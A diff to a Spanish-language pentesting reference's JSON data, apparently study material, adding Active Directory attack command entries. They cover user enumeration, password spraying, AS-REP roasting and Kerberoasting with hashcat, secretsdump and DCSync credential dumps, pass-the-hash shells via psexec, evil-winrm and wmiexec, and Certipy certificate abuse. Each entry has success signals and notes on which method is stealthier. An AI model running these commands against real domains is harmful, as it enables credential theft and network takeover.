@@ -7,7 +7,7 @@
     "totalGuides": 10,
     "totalConcepts": 74,
     "totalPaths": 14,
-    "totalCommandMetadata": 39
+    "totalCommandMetadata": 61
   },
   "tags": [
     "active-directory",
@@ -8901,6 +8901,510 @@
         "John no reconoce el formato: pasa --format"
       ],
       "alternative": "hashcat con el -m correspondiente al tipo de hash.",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "nxc smb $IP -u 'Guest' -p '' --shares",
+      "objective": "Listar shares con la cuenta Guest",
+      "tool": "netexec",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Shares visibles y tus permisos con Guest.",
+      "successSignal": "Se listan shares legibles sin credenciales reales.",
+      "commonErrors": [
+        "Guest deshabilitado"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "nxc smb $IP -u 'Guest' -p '' --rid-brute > rid.txt",
+      "objective": "Enumerar usuarios del dominio por RID cycling",
+      "tool": "netexec",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "Lista de usuarios y grupos del dominio (SID -> nombre).",
+      "successSignal": "rid.txt se llena de cuentas del dominio.",
+      "commonErrors": [
+        "Acceso denegado: sin sesion nula/guest"
+      ],
+      "alternative": "impacket-lookupsid",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "impacket-lookupsid $DOMAIN/guest@$IP -no-pass",
+      "objective": "Sacar usuarios del dominio por fuerza de SID",
+      "tool": "impacket",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "Nombres de cuentas resueltos desde sus RIDs.",
+      "successSignal": "Aparece la lista de usuarios del dominio.",
+      "commonErrors": [
+        "Requiere sesion nula o guest"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "ldapsearch -x -H ldap://$IP -b 'DC=dominio,DC=local' '(objectClass=user)' sAMAccountName",
+      "objective": "Enumerar usuarios via LDAP",
+      "tool": "ldapsearch",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Los sAMAccountName de todas las cuentas de usuario.",
+      "successSignal": "Se listan usuarios para spraying/roasting.",
+      "commonErrors": [
+        "Bind anonimo deshabilitado: usa credenciales"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "kerbrute userenum -d $DOMAIN --dc $DC_FQDN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
+      "objective": "Descubrir usuarios validos via Kerberos",
+      "tool": "kerbrute",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "Los usuarios que existen en el dominio (VALID USERNAME).",
+      "successSignal": "kerbrute marca cuentas validas sin bloquearlas.",
+      "commonErrors": [
+        "DC_FQDN mal resuelto: revisa /etc/hosts"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "nxc smb $IP -u users.txt -p 'Password1!' --continue-on-success",
+      "objective": "Password spraying una clave contra muchos usuarios",
+      "tool": "netexec",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "caution",
+      "preconditions": [
+        "Lista de usuarios validos",
+        "Cuidado con la politica de bloqueo"
+      ],
+      "expectedOutput": "Que usuarios aceptan esa contrasena (marca [+]).",
+      "successSignal": "Aparece un [+] dominio\\usuario:clave valido.",
+      "commonErrors": [
+        "Bloqueo de cuentas si te pasas de intentos"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "kerbrute passwordspray -d $DOMAIN --dc $DC_FQDN users.txt 'Password1!'",
+      "objective": "Password spraying via Kerberos",
+      "tool": "kerbrute",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "Los usuarios cuya contrasena es esa.",
+      "successSignal": "kerbrute marca un login valido.",
+      "commonErrors": [
+        "Politica de bloqueo del dominio"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP",
+      "objective": "AS-REP roasting sin credenciales",
+      "tool": "impacket",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [
+        "Lista de usuarios candidatos"
+      ],
+      "expectedOutput": "Hashes AS-REP de cuentas con preauth deshabilitada.",
+      "successSignal": "Sale un hash $krb5asrep$ para crackear.",
+      "commonErrors": [
+        "Ninguna cuenta tiene 'Do not require preauth'"
+      ],
+      "alternative": "hashcat -m 18200",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "impacket-GetNPUsers $DOMAIN/$USER:$PASS -request -dc-ip $IP -outputfile asrep.hash",
+      "objective": "AS-REP roasting autenticado",
+      "tool": "impacket",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "asrep.hash con los hashes AS-REP del dominio.",
+      "successSignal": "El fichero contiene al menos un $krb5asrep$.",
+      "commonErrors": [
+        "Sin cuentas vulnerables a AS-REP"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt",
+      "objective": "Crackear un hash AS-REP",
+      "tool": "hashcat",
+      "environment": "attacker",
+      "targetOS": "any",
+      "credentialsRequired": false,
+      "credentialType": "hash",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [
+        "Tener asrep.hash"
+      ],
+      "expectedOutput": "La contrasena de la cuenta AS-REP.",
+      "successSignal": "hashcat marca Cracked con la clave.",
+      "commonErrors": [
+        "La clave no esta en el diccionario"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $IP -request -outputfile kerb.hash",
+      "objective": "Kerberoasting: pedir TGS de cuentas de servicio",
+      "tool": "impacket",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [
+        "Una credencial de dominio valida"
+      ],
+      "expectedOutput": "kerb.hash con hashes TGS de cuentas con SPN.",
+      "successSignal": "Sale un $krb5tgs$ para crackear offline.",
+      "commonErrors": [
+        "No hay cuentas con SPN (kerberoastables)"
+      ],
+      "alternative": "hashcat -m 13100",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt",
+      "objective": "Crackear un hash Kerberoast (TGS)",
+      "tool": "hashcat",
+      "environment": "attacker",
+      "targetOS": "any",
+      "credentialsRequired": false,
+      "credentialType": "hash",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "La contrasena de la cuenta de servicio.",
+      "successSignal": "hashcat marca Cracked (suele ser cuenta con privilegios).",
+      "commonErrors": [
+        "La clave no esta en el diccionario"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $IP --zip",
+      "objective": "Recolectar datos de AD para BloodHound",
+      "tool": "bloodhound-python",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "Un .zip con usuarios, grupos, sesiones y ACLs.",
+      "successSignal": "Se genera el zip para cargar en BloodHound.",
+      "commonErrors": [
+        "DNS/-ns mal configurado",
+        "Reloj desincronizado (Kerberos)"
+      ],
+      "alternative": "nxc ldap ... --bloodhound",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "impacket-secretsdump $DOMAIN/$USER:$PASS@$IP",
+      "objective": "Volcar hashes locales (SAM/LSA) de un host",
+      "tool": "impacket",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "admin",
+      "noise": "medium",
+      "risk": "intrusive",
+      "preconditions": [
+        "Ser admin local en el objetivo"
+      ],
+      "expectedOutput": "Hashes NTLM de cuentas locales y secretos LSA.",
+      "successSignal": "Salen hashes Administrator:500:... para PtH/crackeo.",
+      "commonErrors": [
+        "Sin privilegios de admin local"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "impacket-secretsdump -just-dc $DOMAIN/$USER:$PASS@$DC_FQDN",
+      "objective": "DCSync: volcar los hashes del dominio",
+      "tool": "impacket",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "admin",
+      "noise": "high",
+      "risk": "intrusive",
+      "preconditions": [
+        "Cuenta con derechos de replicacion (DA o similar)"
+      ],
+      "expectedOutput": "Todos los hashes NTLM del dominio, incluido krbtgt.",
+      "successSignal": "Aparece el hash de krbtgt y de administrator.",
+      "commonErrors": [
+        "Sin permisos de replicacion (no eres DA)"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "nxc smb $IP -u $USER -H <NTLM>",
+      "objective": "Validar un hash NTLM (pass-the-hash)",
+      "tool": "netexec",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "hash",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "Si el hash vale en ese host (marca Pwn3d! si eres admin).",
+      "successSignal": "Autentica sin conocer la contrasena en claro.",
+      "commonErrors": [
+        "El hash no es valido en ese host"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "impacket-psexec $DOMAIN/$USER@$IP -hashes :<NTLM>",
+      "objective": "Shell SYSTEM remota con pass-the-hash",
+      "tool": "impacket",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "hash",
+      "privileges": "admin",
+      "noise": "high",
+      "risk": "intrusive",
+      "preconditions": [
+        "Hash de un admin local"
+      ],
+      "expectedOutput": "Una shell como NT AUTHORITY\\SYSTEM.",
+      "successSignal": "Obtienes prompt remoto con privilegios maximos.",
+      "commonErrors": [
+        "Ruidoso: crea un servicio (deteccion facil)"
+      ],
+      "alternative": "wmiexec (mas sigiloso)",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "evil-winrm -i $IP -u $USER -p $PASS",
+      "objective": "Shell interactiva por WinRM",
+      "tool": "evil-winrm",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [
+        "Puerto 5985 abierto y usuario en Remote Management Users"
+      ],
+      "expectedOutput": "Una PowerShell remota en el objetivo.",
+      "successSignal": "Entras en la shell de evil-winrm.",
+      "commonErrors": [
+        "WinRM cerrado o usuario sin permiso"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "evil-winrm -i $IP -u $USER -H <NTLM>",
+      "objective": "Shell WinRM con pass-the-hash",
+      "tool": "evil-winrm",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "hash",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "PowerShell remota usando el hash NTLM.",
+      "successSignal": "Entras sin la contrasena en claro.",
+      "commonErrors": [
+        "El usuario no tiene acceso WinRM"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "impacket-wmiexec $DOMAIN/$USER:$PASS@$IP",
+      "objective": "Ejecucion remota sigilosa via WMI",
+      "tool": "impacket",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "mixed",
+      "privileges": "admin",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [],
+      "expectedOutput": "Una semi-shell que ejecuta comandos por WMI.",
+      "successSignal": "Ejecutas comandos sin crear un servicio (mas silencioso que psexec).",
+      "commonErrors": [
+        "Requiere admin local"
+      ],
+      "alternative": "psexec / smbexec",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $IP -vulnerable -stdout",
+      "objective": "Buscar plantillas de certificado vulnerables (AD CS)",
+      "tool": "certipy",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [],
+      "expectedOutput": "Plantillas con ESC1-ESC8 y la CA vulnerable.",
+      "successSignal": "Aparece una plantilla marcada como vulnerable.",
+      "commonErrors": [
+        "No hay AD CS o ninguna plantilla vulnerable"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "active-directory",
+      "command": "certipy auth -pfx administrator.pfx -dc-ip $IP",
+      "objective": "Autenticarse con un certificado y sacar el hash",
+      "tool": "certipy",
+      "environment": "kali",
+      "targetOS": "windows",
+      "credentialsRequired": false,
+      "credentialType": "key",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "intrusive",
+      "preconditions": [
+        "Tener el .pfx emitido a un usuario privilegiado"
+      ],
+      "expectedOutput": "El TGT y el hash NTLM del usuario del certificado.",
+      "successSignal": "Obtienes el hash de administrator para PtH.",
+      "commonErrors": [
+        "Reloj desincronizado (Kerberos)"
+      ],
+      "alternative": "",
       "checkedVersion": "2025.1",
       "reviewedAt": "2026-07-11"
     }
